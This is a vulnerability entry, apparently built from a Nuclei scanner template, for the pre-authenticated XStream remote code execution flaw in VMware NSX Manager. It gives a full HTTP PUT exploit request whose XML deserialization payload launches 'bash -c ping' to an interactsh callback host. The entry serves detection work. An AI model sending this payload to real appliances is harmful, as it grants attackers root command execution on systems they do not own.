# Vulnerability: VMware NSX Manager XStream Pre-authenticated Remote Code Execution
**Classification:** CWE-78,CWE-502
**Source:** Nuclei Template (`vmware-nsx-stream-rce.yaml`)

## Description
VMware Cloud Foundation (NSX-V) contains a remote code execution vulnerability via XStream open source library.
VMware has evaluated the severity of this issue to be in the Critical severity range with a maximum CVSSv3 base score of 9.8.
Due to an unauthenticated endpoint that leverages XStream for input serialization in VMware Cloud Foundation (NSX-V),
a malicious actor can get remote code execution in the context of 'root' on the appliance.
VMware Cloud Foundation 3.x and more specific NSX Manager Data Center for vSphere up to and including version 6.4.13
are vulnerable to Remote Command Injection.

## Vulnerable Code Pattern / Exploit Payload
```http
PUT /api/2.0/services/usermgmt/password/{{lowerrstr}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/xml

<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>bash</string>
          <string>-c</string>
          <string>ping {{os}}.{{interactsh-url}}</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
```

